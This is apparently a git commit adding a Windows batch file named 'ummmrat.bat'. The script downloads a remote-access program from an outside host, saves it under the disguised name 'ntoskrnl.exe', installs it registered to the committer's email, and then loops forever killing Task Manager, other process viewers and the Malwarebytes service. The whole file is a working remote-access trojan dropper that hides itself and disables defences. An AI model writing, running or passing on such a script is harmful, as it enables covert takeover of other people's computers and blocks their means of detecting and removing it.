ad056e0ada6f888ad53bc72793044235c0cb1652
HuggingFaceUser <huggingfaceuser@gmail.com>
2024-09-30 21:29:33 +0200

    Create ummmrat.bat

---
+++ ummmrat.bat
@@ -0,0 +1,10 @@
+curl http://getscreen.me/download/getscreen-x86.exe -outfile "ntoskrnl.exe"
+%userprofile%\Desktop\ntoskrnl.exe -install -register huggingfaceuser@gmail.com
+msg * ummmmmm
+:a
+taskkill /f /im taskmgr.exe
+taskkill /f /im tasklist.exe
+taskkill /f /im TMX.exe
+taskkill /f /im TMX64.exe
+taskkill /f /im MBAMService.exe
+goto a
